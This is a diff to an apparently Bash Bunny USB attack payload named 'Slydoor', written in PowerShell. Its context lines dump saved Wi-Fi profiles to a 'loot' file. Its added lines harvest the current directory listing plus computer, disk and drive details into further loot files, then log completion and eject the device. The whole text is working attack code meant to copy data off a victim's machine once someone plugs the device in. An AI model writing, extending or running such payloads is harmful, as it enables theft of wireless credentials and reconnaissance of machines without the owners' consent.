@@ -9,6 +9,16 @@ $output = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matc
 $output | Out-File $bb\loot\Slydoor\loot_wlan.txt -Encoding ASCII
 echo "+ PSP: 'Get-WLAN' logged to loot_wlan.txt" | Out-File $bb\logs\Slydoor.log -Append -Encoding ASCII
 
+# Gets items in current directory
+Get-ChildItem | Out-File $bb\loot\Slydoor\loot_items.txt -Encoding ASCII
+echo "+ PSP: 'Get-ChildItem' logged to loot_items.txt" | Out-File $bb\logs\Slydoor.log -Append -Encoding ASCII
+
+# Get computer details
+Get-WmiObject -Class Win32_ComputerSystem | Out-File $bb\loot\Slydoor\loot_details.txt -Encoding ASCII
+Get-WmiObject -Class Win32_DiskDrive | Out-File $bb\loot\Slydoor\loot_details.txt -Append -Encoding ASCII
+Get-WmiObject -Class Win32_LogicalDisk | Out-File $bb\loot\Slydoor\loot_details.txt -Append -Encoding ASCII
+echo "+ PSP: Variations of 'Get-WmiObject' logged to loot_details.txt" | Out-File $bb\logs\Slydoor.log -Append -Encoding ASCII
+
 # Tell the BB that we've finished and eject the BB
 echo "+ Powershell payload complete" | Out-File $bb\logs\Slydoor.log -Append -Encoding ASCII
 $driveEject = New-Object -comObject Shell.Application
